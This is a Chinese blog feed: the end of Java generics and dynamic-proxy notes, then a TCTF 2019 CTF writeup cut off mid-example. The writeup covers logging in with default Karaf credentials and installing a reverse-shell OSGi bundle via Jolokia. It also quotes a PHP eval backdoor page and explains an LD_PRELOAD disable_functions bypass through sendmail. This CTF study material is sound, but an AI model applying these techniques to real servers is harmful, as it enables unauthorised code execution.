//由于泛型方法在声明的时候会声明泛型&lt;E&gt;，因此即使在泛型类中并未声明泛型，编译器也能够正确识别泛型方法中识别的泛型。        public &lt;E&gt; void show_3(E t)&#123;            System.out.println(t.toString());        &#125;        //在泛型类中声明了一个泛型方法，使用泛型T，注意这个T是一种全新的类型，可以与泛型类中声明的T不是同一种类型。        public &lt;T&gt; void show_2(T t)&#123;            System.out.println(t.toString());        &#125;    &#125;    public static void main(String[] args) &#123;        Apple apple = new Apple();        Person person = new Person();        GenerateTest&lt;Fruit&gt; generateTest = new GenerateTest&lt;Fruit&gt;();        //apple是Fruit的子类，所以这里可以        generateTest.show_1(apple);        //编译器会报错，因为泛型类型实参指定的是Fruit，而传入的实参类是Person        //generateTest.show_1(person);        //使用这两个方法都可以成功        generateTest.show_2(apple);        generateTest.show_2(person);        //使用这两个方法也都可以成功        generateTest.show_3(apple);        generateTest.show_3(person);    &#125;&#125;</code></pre><h5 id="4-静态方法与泛型"><a href="#4-静态方法与泛型" class="headerlink" title="4.静态方法与泛型"></a><strong>4.静态方法与泛型</strong></h5><p>静态方法无法访问类上定义的泛型；如果静态方法要使用泛型的话，必须将静态方法也定义成泛型方法 </p><pre><code class="hljs">public class StaticGenerator&lt;T&gt; &#123;    ....    ....    /**     * 如果在类中定义使用泛型的静态方法，需要添加额外的泛型声明（将这个方法定义成泛型方法）     * 即使静态方法要使用泛型类中已经声明过的泛型也不可以。     * 如：public static void show(T t)&#123;..&#125;,此时编译器会提示错误信息：          &quot;StaticGenerator cannot be refrenced from static context&quot;     */    public static &lt;T&gt; void show(T t)&#123;    &#125;&#125;</code></pre><h5 id="5-泛型的上下边界"><a href="#5-泛型的上下边界" class="headerlink" title="5.泛型的上下边界"></a><strong>5.泛型的上下边界</strong></h5><p>为泛型添加上边界，即传入的类型实参必须是指定类型的子类型</p><pre><code class="hljs">public void showKeyValue1(Generic&lt;? extends Number&gt; obj)&#123;    System.out.println(&quot;泛型测试 key value is &quot; + obj.getKey());&#125;Generic&lt;String&gt; generic1 = new Generic&lt;String&gt;(&quot;11111&quot;);Generic&lt;Integer&gt; generic2 = new Generic&lt;Integer&gt;(2222);Generic&lt;Float&gt; generic3 = new Generic&lt;Float&gt;(2.4f);Generic&lt;Double&gt; generic4 = new Generic&lt;Double&gt;(2.56);    //showKeyValue1(generic1);//这一行代码编译器会提示错误，因为String类型并不是Number类型的子类showKeyValue1(generic2);showKeyValue1(generic3);showKeyValue1(generic4);</code></pre><blockquote><p><strong>注意：</strong></p><p>为泛型方法添加上下边界的时候，必须在权限声明与返回值之间的<code>&lt;T&gt;</code>上添加上下边界，即在泛型声明的时候添加</p><pre><code class="hljs">//public &lt;T&gt; T showKeyName(Generic&lt;T extends Number&gt; container)，编译器会报错：&quot;Unexpected bound&quot;public &lt;T extends Number&gt; T showKeyName(Generic&lt;T&gt; container)&#123;    System.out.println(&quot;container key :&quot; + container.getKey());    T test = container.getKey();    return test;</code></pre></blockquote><h5 id="6-泛型数组"><a href="#6-泛型数组" class="headerlink" title="6.泛型数组"></a><strong>6.泛型数组</strong></h5><p>也就是说下面的这个例子是不可以的：</p><p>List<String>[] ls &#x3D; new ArrayList<String>[10];  </p><p>而使用通配符创建泛型数组是可以的，如下面这个例子：</p><p>List<?>[] ls = new ArrayList<?>[10];  </p><p>这样也是可以的：</p><p>List<String>[] ls &#x3D; new ArrayList[10];</p><h2 id="0X02-动态代理"><a href="#0X02-动态代理" class="headerlink" title="0X02 动态代理"></a><strong>0X02 动态代理</strong></h2><h3 id="1-什么是代理"><a href="#1-什么是代理" class="headerlink" title="1.什么是代理"></a><strong>1.什么是代理</strong></h3><p>我想代理这个词对我们从事计算机行业的人来说并不陌生，我们会通过代理去访问国外的一些网站，我们在渗透时通过代理去访问内部网络…代理就是我们与目标的一个中间人，我们想访问目标就要先访问代理，然后代理再代替我们访问目标。</p><h3 id="2-我们为什么需要代理呢"><a href="#2-我们为什么需要代理呢" class="headerlink" title="2.我们为什么需要代理呢"></a><strong>2.我们为什么需要代理呢</strong></h3><p>我们在网络中需要代理是因为我们可能无法直接访问对应的目标，但是这在开发中并不存在，我们不会说访问不到我们自己定义的某一个类，那我们要代理做什么？实际上，我上面说了代理其实是我们与目标的一个中间人，中间人难道只能原封不动的传递信息吗？当然不是，要不就没有中间人攻击了对不对？</p><p>我们这里设置代理实际上是想动态地给我们要访问的对象添加功能，如果我们直接调用 A 对象的 a 方法的话，那就只能运行 a 方法，但是如果我们给 A 对象添加一个代理 ，然后我们在代理类中就可以在 a 方法前面添加 b 方法，在 a 方法后面添加 c 方法，然后我们通过代理类的对象 D 去调用 a 方法的时候就能同时运行 b 和 c 方法，这就是我们添加代理的目的。</p><p>在实际的场景中经常出现在要给某个返回值添加过滤器，那么我们的代理就可以作为一个过滤器，那又有人要问了，为什么不直接在原来的类里面添加过滤器？那是因为如果只有一个类还好说，但是如果有一个“类族” 都要添加过滤器呢？对吧，我们使用代理就能实现一次编写到处使用了。</p><h3 id="3-动态代理和静态代理的区别"><a href="#3-动态代理和静态代理的区别" class="headerlink" title="3.动态代理和静态代理的区别"></a><strong>3.动态代理和静态代理的区别</strong></h3><p>本节的标题是动态代理，那么相对的肯定有静态代理，为了体现动态代理的优势，我们这里还是要介绍一下静态代理的使用方法，然后对比引出动态代理。</p><p>代理的本质是新创建了一个类，这个类要相对于原始类有了更强大的功能，那么静态代理就非常的死板，他必须要实现原始类的接口，因此相当于将原始类硬编译进去了</p><h4 id="1-静态代理的实现"><a href="#1-静态代理的实现" class="headerlink" title="(1)静态代理的实现"></a><strong>(1)静态代理的实现</strong></h4><p>假设，开发者写代码之前并没有写文档的习惯，现在老板要求开发人员必须要在写代码前先写文档，于是我们可以给开发人员的类添加一个代理实现这个功能</p><pre><code class="hljs">/** * 目标对象实现的接口 */public interface IDeveloper &#123;    public void writeCode();&#125;/** * 目标对象实现类 */    public class Developer implements IDeveloper&#123;private String name;public Developer(String name)&#123;this.name = name;&#125;@Overridepublic void writeCode() &#123;System.out.println(&quot;Developer &quot; + name + &quot; writes code&quot;);&#125;&#125;/** * 代理类，需要实现与目标对象相同的接口来实现目标原始的功能 */ public class DeveloperProxy implements IDeveloper&#123;private IDeveloper developer;public DeveloperProxy(IDeveloper developer)&#123;this.developer = developer;&#125;@Overridepublic void writeCode() &#123;System.out.println(&quot;Write documentation...&quot;);this.developer.writeCode();&#125;&#125;/** * 最终调用，先去实现原始的类，然后把原始类对象传入代理类创建代理类对象 */     public class DeveloperTest &#123;public static void main(String[] args) &#123;IDeveloper jerry = new Developer(&quot;Jerry&quot;);IDeveloper jerryProxy = new DeveloperProxy(jerry);jerryProxy.writeCode();&#125;&#125;/** * 运行结果 */Write documentation...Developer jerry writes code</code></pre><h5 id="解释："><a href="#解释：" class="headerlink" title="解释："></a><strong>解释：</strong></h5><p><strong>1.代理类的代码中涉及到了接口类型的对象，实现相同接口的对象可以有不同的动作，实际上这是实现多态的常用手法,下面是一个使用接口实现多态的例子</strong></p><p>(1)定义一个接口TestFace</p><pre><code class="hljs">public interface TestFace&#123;//定一个接口   void make();//定义一个接口方法&#125;</code></pre><p>(2)定义一个类MyClass，里面包含一个接口型变量</p><pre><code class="hljs">public class MyClass&#123;//定义一个类    TestFace tf;//定义一个接口型变量tf    public MyClass(TestFace tf)&#123;//构造函数初始化接口型变量tf       this.tf = tf;    &#125;    public work()&#123;  //函数调用       this.tf.make();//实际的接口型类实例。    &#125;&#125;</code></pre><p>(3)定义2个类，实现接口TestFace </p><pre><code class="hljs">public class C1 implements TestFace&#123;//定一个类C1实现接口TestFace    public void make()&#123;//实现接口的方法make       System.out.println(&quot;c1&quot;);//打印c1    &#125;&#125;public class C2 implements TestFace&#123;//定一个类C2实现接口TestFace    public void make()&#123;//实现接口的方法make       System.out.println(&quot;c2&quot;);//打印c2    &#125;&#125;</code></pre><p>(4)使用接口变量</p><pre><code class="hljs">TestFace tf1 = new C1();//实现一个类实例C1TestFace tf2 = new C2();//实现一个类实例C2MyClass mc = MyClass(tf1);//定义一个MyClass的类实例，使用tf1MyClass mc2 = MyClass(tf2);//定义一个MyClass的类实例，使用tf1//同一个类的work，能够实现不同的打印内容mc.work();mc2.work();</code></pre><p><strong>2.最终调用部分传入的是原始的对象</strong></p><h4 id="2-静态代理方式的缺点"><a href="#2-静态代理方式的缺点" class="headerlink" title="(2)静态代理方式的缺点"></a><strong>(2)静态代理方式的缺点</strong></h4><p>比如我们还想要求测试工程师在进行测试之前也要写文档，那么我们还需要从新编辑我们的代理类，添加我们测试接口</p><pre><code class="hljs">public interface ITester &#123;public void doTesting();&#125;public class Tester implements ITester &#123;private String name;public Tester(String name)&#123;this.name = name;&#125;@Overridepublic void doTesting() &#123;System.out.println(&quot;Tester &quot; + name + &quot; is testing code&quot;);&#125;&#125;public class TesterProxy implements ITester&#123;private ITester tester;public TesterProxy(ITester tester)&#123;this.tester = tester;&#125;@Overridepublic void doTesting() &#123;System.out.println(&quot;Tester is preparing test documentation...&quot;);tester.doTesting();&#125;&#125;</code></pre><p>由于静态代理的每次为一个新的类做代理的时候都要实现新的接口，这样这个代理类就太不通用了，代码量就大大提升，所以我们就有了一个新的代理方法，叫做动态代理，这种代理方式不需要去实现所代理的累的接口，使用起来更加方便。</p><h4 id="2-动态代理的实现"><a href="#2-动态代理的实现" class="headerlink" title="(2)动态代理的实现"></a><strong>(2)动态代理的实现</strong></h4><pre><code class="hljs">  /**     * 代理类，无需实现原始类的接口     */public class EnginnerProxy implements InvocationHandler &#123;Object obj;public Object bind(Object obj)&#123;this.obj = obj;return Proxy.newProxyInstance(obj.getClass().getClassLoader(), obj.getClass().getInterfaces(), this);&#125;@Overridepublic Object invoke(Object proxy, Method method, Object[] args)throws Throwable&#123;System.out.println(&quot;Enginner writes document&quot;);Object res = method.invoke(obj, args);return res;&#125;&#125; /** * 新的接口 */public interface ITester &#123;public void doTesting();&#125;  /** * 新的类 */    public class Tester implements ITester &#123;private String name;public Tester(String name)&#123;this.name = name;&#125;@Overridepublic void doTesting() &#123;System.out.println(&quot;Tester &quot; + name + &quot; is testing code&quot;);&#125;&#125;  /** * 最终调用，先去实现原始的类，然后把原始类对象传入代理类创建代理类对象 */public class DeveloperTest &#123;    public static void main(String[] args) &#123;        IDeveloper jerry = new Developer(&quot;Jerry&quot;);        ITester Tom = new Tester(&quot;Tom&quot;);        IDeveloper jerryProxy = (IDeveloper) new EngineerProxy().bind(jerry);        jerryProxy.writeCode();        ITester TomProxy = (ITester) new EngineerProxy().bind(Tom);        TomProxy.doTesting();    &#125;&#125; /** * 运行结果 */Enginner writes documentDeveloper Jerry writes codeEnginner writes documentTester Tom is testing code</code></pre><h5 id="1-InvocationHandler"><a href="#1-InvocationHandler" class="headerlink" title="1.InvocationHandler"></a><strong>1.InvocationHandler</strong></h5><p>首先我们看到的是 InvocationHandler ，这是 JDK 为我们提供的一个内置接口，从名字就能看出来这是一个调用处理程序的实现接口，因为我们代理类的函数调用实现都是通过内部的一个 invok 方法实现的</p><h5 id="2-newProxyInstance"><a href="#2-newProxyInstance" class="headerlink" title="2.newProxyInstance"></a><strong>2.newProxyInstance</strong></h5><p>newProxyInstance 方法用来返回一个代理对象，它的函数原型:</p><pre><code class="hljs">static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) </code></pre><p><strong>我们来解释一下这三个参数：</strong></p><p><strong>(1)ClassLoader loader:</strong> 定义了这个新的类的加载器，我们知道每一个类在 javac 编译器编译后都会从 .java 文件转化成对应的 .class 文件(这在我们的反射机制中是比较重要的部分)，加载器的作用就是将 .class 文件中的 虚拟机指令转化成对应的类的字节码</p><p><strong>(2)<code>Class&lt;?&gt;[] interfaces:</code></strong> 用来指明生成的代理对象要实现的接口，这里其实是通过反射的方法去获取的</p><p><strong>(3)InvocationHandler h:</strong> 来指明这个代理对象需要完成的动作，实际上就是 invoke 函数，所以这里用 This 作为实参</p><h5 id="3-invoke"><a href="#3-invoke" class="headerlink" title="3.invoke"></a><strong>3.invoke</strong></h5><p>代理对象调用任何方法都会被这个方法截获，所以这个方法是代理对类的核心方法，它有三个参数，并且这三个参数是在调用过程中自动传入的，无需认为干预</p><p>**(1)proxy:**代表我们要代理的原始对象</p><p>**(2)method:**我们通过代理对象调用的原对象的方法，这里要注意，如果原始类的方法有很多的话，这里可以使用反射的方式获取到调用的具体方法名，然后写一个判断，从而调用不同的方法</p><pre><code class="hljs">if(method.getName().equals(&quot;xxx&quot;))</code></pre><p>**(3)args:**原对象方法的参数</p><h2 id="0X03-参考链接"><a href="#0X03-参考链接" class="headerlink" title="0X03 参考链接"></a><strong>0X03 参考链接</strong></h2><p><a href="https://www.cnblogs.com/jiyukai/p/6958744.html">https://www.cnblogs.com/jiyukai/p/6958744.html</a><br><a href="https://cloud.tencent.com/developer/article/1185885">https://cloud.tencent.com/developer/article/1185885</a><br><a href="https://zhidao.baidu.com/question/342312672.html">https://zhidao.baidu.com/question/342312672.html</a><br><a href="https://www.cnblogs.com/xdp-gacl/p/3971367.html">https://www.cnblogs.com/xdp-gacl/p/3971367.html</a><br><a href="https://www.cnblogs.com/xdp-gacl/p/3629723.html">https://www.cnblogs.com/xdp-gacl/p/3629723.html</a><br><a href="https://blog.csdn.net/s10461/article/details/53941091">https://blog.csdn.net/s10461/article/details/53941091</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCTF 2019 线上赛 web 题 writeup</title>
    <link href="/2019/04/04/TCTF%202019%20%E7%BA%BF%E4%B8%8A%E8%B5%9B%20web%20%E9%A2%98%20writeup/"/>
    <url>/2019/04/04/TCTF%202019%20%E7%BA%BF%E4%B8%8A%E8%B5%9B%20web%20%E9%A2%98%20writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>TCTF 2019 来了，2018 年线上赛的几道 CSP 令人记忆犹新，但是当时太菜并做不出来，final 也没有什么 web 题，被教做人，2019 又会有什么样的惊喜呢，又能学到什么新知识呢，简单记录一下解题思路。</p><h2 id="0X01-Ghost-Pepper"><a href="#0X01-Ghost-Pepper" class="headerlink" title="0X01 Ghost Pepper"></a><strong>0X01 Ghost Pepper</strong></h2><h3 id="1-题目概览"><a href="#1-题目概览" class="headerlink" title="1.题目概览"></a><strong>1.题目概览</strong></h3><p>访问页面需要 <a href="https://segmentfault.com/a/1190000004406025//www.freebuf.com/vuls/166695.html">basic 认证</a>，然后抓包看到响应中有认证的提示</p><pre><code class="hljs">WWW-Authenticate: BASIC realm=&quot;karaf&quot;</code></pre><p>我们尝试使用 karaf:karaf 登录，发现登录成功</p><span id="more"></span><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp1.png" alt="此处输入图片的描述"></p><p>这应该是第一个提示 ：karaf </p><p>通过阅读<a href="http://karaf.apache.org/manual/latest/#_overview">官方文档</a>，我们可以发现 karaf 是一个由 OSGI 提供支持的轻量级的容器，可以通过JMX提供管理和操作，同时 Apache Karaf提供了一个JMX MBeanServer。可以使用任何JMX客户端（如jconsole）远程使用此MBeanServer。</p><p>接下来就是带着这些问题去了解什么是 osgi ，例如：osgi 有哪些特性、核心组件是什么</p><p>**从<a href="http://baijiahao.baidu.com/s?id=1600246970563166864&wfr=spider&for=pc">这篇文章</a>中可以得到如下信息：**一个OSGi程序是由一系列OSGi bundles组成的。OSGi bundle 是一个在MANIFEST中带有附加元数据的jar文件。</p><p>目前没有什么其他的信息，这个页面也没有任何服务，只是下面的 powered by 告诉你这是一个 java 的应用程序，并且在搜索了一下以后 jetty 在最近并没有爆出什么严重的漏洞，那么在这种没有任何业务场景的情况下能够出现漏洞的地方应该就是一些 API 接口了，然后我就尝试扫了一下端口，发现除了本身题目的端口以外只开了 22 端口，着很明显是出题人登录服务器用的端口，并不是我们可以利用的条件。</p><p>猜测题目本身也是提示，于是谷歌一番发现 Ghost pepper 和 jolokia 有一定的关系</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp15.png" alt="此处输入图片的描述"></p><p>而 <a href="https://jolokia.org/">jolokia</a> 存在一个 JMX 代理模式，通过 HTTP 的 JMX(Java Management Extensions) 连接器，提供了类 RESTful 的操作方式，可以通过 POST JSON 的方式访问和修改 JMX 属性、执行 JMX 操作、搜索 MBean、列出 MBean 的 Meta-data 等</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp17.png" alt="此处输入图片的描述"></p><p>根基官方文档提供的方法，简单测试了一下，可以说思路是没问题了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp2.png" alt="此处输入图片的描述"></p><p>然后根据<a href="https://www.freebuf.com/vuls/166695.html">这篇文章</a>的大概思路，我们知道我们大致有<strong>以下三种攻击思路：</strong></p><p>1.JNDI 注入<br>2.信息泄露<br>3.远程操作 MBeans</p><p>而根据上面的分析，我们大致确定了我们的攻击方向是 通过jolokia 的 JMX 代理模式远程操作 apache karaf 为我们提供的 Mbeans</p><h3 id="2-补充："><a href="#2-补充：" class="headerlink" title="2.补充："></a><strong>2.补充：</strong></h3><h4 id="1-关于-MBean"><a href="#1-关于-MBean" class="headerlink" title="1.关于 MBean"></a><strong>1.关于 MBean</strong></h4><p>MBean 是Managed Bean的简称，可以翻译为“管理构件”。在JMX中MBean代表一个被管理的资源实例，通过MBean中暴露的方法和属性，<strong>外界可以获取被管理的资源的状态和操纵MBean的行为</strong>。事实上，MBean就是一个Java Object，同JavaBean模型一样，外界使用自醒和反射来获取Object的值和调用Object的方法，只是MBean更为复杂和高级一些。MBean通过公共方法以及遵从特定的设计模式封装了属性和操作，以便暴露给管理应用程序，详细的的资料<a href="http://karaf.apache.org/manual/latest/#_mbeans">请看这里</a></p><p>Mbeans 对象有着相同的格式：</p><pre><code class="hljs">org.apache.karaf:type=[feature],name=[instance]</code></pre><p>安装其他Apache Karaf功能和外部应用程序可以提供新的MBean。</p><p><strong>下面是一些简单的罗列：</strong></p><pre><code class="hljs">org.apache.karaf:type=bundle,name=*: OSGi bundle 的管理.org.apache.karaf:type=config,name=*: 配置管理.org.apache.karaf:type=diagnostic,name=*: 创建包含当前Apache Karaf活动的转储.org.apache.karaf:type=feature,name=*: Apache Karaf功能的管理.org.apache.karaf:type=http,name=*: HTTP服务的管理（由http功能提供）.org.apache.karaf:type=instance,name=*: 实例的管理 .org.apache.karaf:type=jdbc,name=*: JDBC服务的管理（由jdbc功能提供）.org.apache.karaf:type=jms,name=*: JMS服务的管理（由jms功能提供）.org.apache.karaf:type=jndi,name=*: JNDI服务的管理（由jndi功能提供）.org.apache.karaf:type=kar,name=*: 管理KAR文件.org.apache.karaf:type=log,name=*: 日志服务的管理.org.apache.karaf:type=obr,name=*: 管理OBR服务（由obr功能提供）.org.apache.karaf:type=package,name=*: 有关导出/导入的包的详细信息.org.apache.karaf:type=service,name=*: OSGi服务的管理.org.apache.karaf:type=system,name=*: Apache Karaf容器本身的管理（暂停，重启等）.org.apache.karaf:type=web,name=*: ：WebApplications的管理（由war功能提供）.org.apache.karaf:type=wrapper,name=*: 服务包装器的管理（由包装器功能提供）.</code></pre><h4 id="2-关于-JMX"><a href="#2-关于-JMX" class="headerlink" title="2.关于 JMX"></a><strong>2.关于 JMX</strong></h4><p><strong>JMX的架构是组件式的，被设计为三层：</strong></p><p>**1.分布层（Distributed layer）：**包含可以使管理应用与JMX Agents交互的组件。一旦通过交互组件与JMX Agents建立连接，用户可以用管理工具来和注册在Agents中的MBeans进行交互<br>**2.代理层（Agent layer ）：**包含JMX Agent以及它们包含的MBean Servers。Agent layer的主要组件是MBean server，作为JMX Agents的核心，它充当MBeans的注册中心。该层提供了4个Agent 服务来使对MBean的管理更容易：计时器（Timer）、监控（monitoring）、动态加载MBean（dynamic MBean loading ）、关系服务（relationship services ）<br>**3.指示层（Instrumentation layer）：**包含代表可管理资源的MBeans。该层是最接近管理资源的，它由注册在Agents中的MBeans组成，这个MBean允许通过JMX Agent来管理。每个MBean都暴露出来针对底层资源的操作和访问；</p><h4 id="3-具体的架构分层如下图："><a href="#3-具体的架构分层如下图：" class="headerlink" title="3.具体的架构分层如下图："></a><strong>3.具体的架构分层如下图：</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp14.png" alt="此处输入图片的描述"></p><h4 id="4-jolokia-的语法"><a href="#4-jolokia-的语法" class="headerlink" title="4.jolokia 的语法"></a><strong>4.jolokia 的语法</strong></h4><p>为了能够成功利用这里面的 MBean 我们还必须对 jolokia 的 POST 语法比较熟悉，我们去翻一下<a href="https://jolokia.org/reference/html/protocol.html#request-response">官方文档</a></p><h3 id="3-开始利用"><a href="#3-开始利用" class="headerlink" title="3.开始利用"></a><strong>3.开始利用</strong></h3><p>根据之前引用的那篇文章，我们现在的思路就是这样，我们需要在 list 列表里面找到一个我们能够引用的 MBean 根据其自带的操作，实现命令执行然后反弹 shell 去读 flag </p><h4 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a><strong>bundle</strong></h4><p>那么既然我们之前已经了解到了 osgi 是依赖于 bundle 的，而且在上面官方文档提供的名单里 bunlde 是那我们就首先看一下 List 列表里面关于 bundle 的信息吧</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp18.png" alt="此处输入图片的描述"></p><p>可以看到这里面的方法还是非常多的，但是最引人注目的还是可以自己安装并开启一个 bundle 了，那么 非常好，我们现在就需要阅读源码，看一下其 install 的步骤，然后我们自己编写一个带有反弹 shell 功能的 bundle 给他安装上，再 strat() 就 ok 了。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp19.png" alt="此处输入图片的描述"></p><p>可以看到，安装的方式非常简单，我们只要传入 jar 包的 url 就可以了，并且值得一提的是在安装以后会自动帮我们调用 start() 函数，这还帮我们省去了一个步骤</p><p>那我们开始构建 bundle 的 jar 包，参考<a href="https://blog.csdn.net/Love_Taylor/article/details/75194394">这篇文章</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp20.png" alt="此处输入图片的描述"></p><p>我们将 jar 包上传到自己的服务器上，然后使用 json 格式发起请求</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp21.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp23.png" alt="此处输入图片的描述"></p><h2 id="0X02-Wallbreaker-Easy"><a href="#0X02-Wallbreaker-Easy" class="headerlink" title="0X02 Wallbreaker Easy"></a><strong>0X02 Wallbreaker Easy</strong></h2><h3 id="1-题目概览-1"><a href="#1-题目概览-1" class="headerlink" title="1.题目概览"></a><strong>1.题目概览</strong></h3><p>很明显这是一道 Bypass disable_function 的题（一开始都是一个 tmp 目录，后来出题人稍微改了一下）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp7.png" alt="此处输入图片的描述"></p><p>并且出题人给了我们一个受限的 shell</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp4.png" alt="此处输入图片的描述"></p><p>通过这个 shell 我们能看到这个文件是怎么写的</p><pre><code class="hljs">&lt;?php$dir = &quot;/tmp/&quot; . md5(&quot;$_SERVER[REMOTE_ADDR]&quot;);mkdir($dir);ini_set(&#39;open_basedir&#39;, &#39;/var/www/html:&#39; . $dir);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;.pre &#123;word-break: break-all;max-width: 500px;white-space: pre-wrap;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;pre class=&quot;pre&quot;&gt;&lt;code&gt;Imagick is a awesome library for hackers to break `disable_functions`.So I installed php-imagick in the server, opened a `backdoor` for you.Let&#39;s try to execute `/readflag` to get the flag.Open basedir: &lt;?php echo ini_get(&#39;open_basedir&#39;);?&gt;&lt;?php eval($_POST[&quot;backdoor&quot;]);?&gt;Hint: eval($_POST[&quot;backdoor&quot;]);&lt;/code&gt;&lt;/pre&gt;&lt;/body&gt;</code></pre><p>根据提示出题人的意图是让我们利用 Imagick 这个 PHP 库去 Bypass，但是不管怎么样还是要看一下 phpinfo 中的 disable_functions</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp5.png" alt="此处输入图片的描述"></p><p>复制出来就是下面的样子</p><pre><code class="hljs">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</code></pre><p><strong>对比一下我之前总结过得一个列表(如下)可以看到出题人将 pcntl 过滤的比较完全了，</strong></p><pre><code class="hljs">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link,map_open,imap_mail,ini_set,ini_alter</code></pre><p><strong>(我这里还需要加一个syslog、imap_open，ld -&gt;这个很明显是出题人写错了应该是 dl map_open 我发现我写错了，根本没这个函数)</strong></p><p><strong>下面是出题人没有过滤到的</strong>，我们可以尝试利用一下，看看有没有突破的希望    </p><pre><code class="hljs">putenv、apache_setenv、mb_send_mail、assert、set_time_limit、ignore_user_abort、ini_set、ini_alter、dl、imap_mail</code></pre><p>当然在利用之前，我们还是要看一下 PHP 目前安装了哪些组件，因为有些利用方式是依赖于特殊组件的，并且要明确 <strong>php 的版本是 7.2.15</strong>，这两个限制就能排除一些可能</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp6.png" alt="此处输入图片的描述"></p><p><strong>排除一些可能：</strong></p><p>dl —————————————&gt;  php 7.0.0 在 PHP-FPM 模式下已禁用 dl()<br>imap_mail ——————————&gt; 没有安装对应组件并且已经禁用 imap_open<br>mb_send_mail  ————————–&gt; mbstring 不是一个默认扩展<br>assert        ———————————–&gt; 属于代码执行，暂时不考虑<br>ignore_user_abort  —————————&gt; 默认不开启,但这里能配合 ini_set 生效，但是不能直接执行命令<br>ini_set        ——————————&gt; 能修改的实际上很少必须要满足<a href="https://www.php.net/manual/zh/configuration.changes.modes.php">选项模式</a>为 PHP_INI_USER 或者 PHP_INI_ALL (<a href="https://www.php.net/manual/zh/ini.list.php">这里</a>是参数的修改范围列表)<br>set_time_limit   —————————–&gt; 并不能直接执行命令</p><blockquote><p><strong>注：一些能使用 ini_set 修改的高危配置</strong></p><p>open_basedir  ———–出题人在文件一开始设置了这个选项，后来我再设置发现并没有办法覆盖<br>error_log  设置脚本错误将被记录到的文件<br>include_path<br>session.save_path</p></blockquote><p><strong>研究：</strong></p><p>error log 能触发 sendmail (服务器有安装 sendmail，只是禁用了 mail)<br>ffmpeg</p><p><strong>其实看了一圈，最惹人注目的还是 putenv 了</strong>，出题人不可能不知道这个函数的厉害，没有禁用估计就是利用这个没问题了，我们原来的利用方式是结合 LD_PRELOAD 劫持 getuid ，然后结合 mail() 函数调用 sendmail再调用 getuid 实现命令执行(<strong>而这个攻击方法的本质是php的函数在运行的时候会去调动系统命令创建进程，新的进程又能调用系统函数，然后我们就能劫持这个系统函数</strong>)</p><p><strong>比如我们编辑一个 mail.php</strong></p><pre><code class="hljs">&lt;?php    mail(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;);?&gt;</code></pre><p>然后去使用 strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve 去追踪一下内部的进程创建</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp11.png" alt="此处输入图片的描述"></p><p>可以看到，Mail 函数调用了 &#x2F;usr&#x2F;bin&#x2F;sendmail，sendmail 可能会加载的函数中</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp12.png" alt="此处输入图片的描述"></p><p>并且在实际的调用中，确实也加载了这个函数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp13.png" alt="此处输入图片的描述"></p><p>至此，我们应该已经很清楚原始的攻击方法的思路了，我们如果劫持了 getuid() 以后再在 php 中调用 mail() 函数，那么我们自定义的getuid()函数就会被执行,从而成功执行系统命令。</p><p>但是 mail 在这里被禁了，我们只能自己去挖掘别的函数了。</p><h3 id="2-第一种思路—-寻找别的函数"><a href="#2-第一种思路—-寻找别的函数" class="headerlink" title="2.第一种思路—&gt; 寻找别的函数"></a><strong>2.第一种思路—&gt; 寻找别的函数</strong></h3><p>上面说了本来的 mail() 是可以的，还有 mb_send_mail() 、imap_mail ()、ffmpeg 也是可以的，但是后面三个都不是内置的默认存在的组件，都需要环境安装才行，所以我们只能再去找更隐蔽的，于是 error_log() 这个函数出现了</p><p>我们来看一下 error_log 的参数：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp26.png" alt="此处输入图片的描述"></p><p>可以看到，这函数是支持向邮箱发送信息的，并且调用的是和 mail() 底层相同的函数，这不是明显说的是 sendmail ,我们来测试一下</p><p><strong>mail.php</strong></p><pre><code class="hljs">&lt;?php  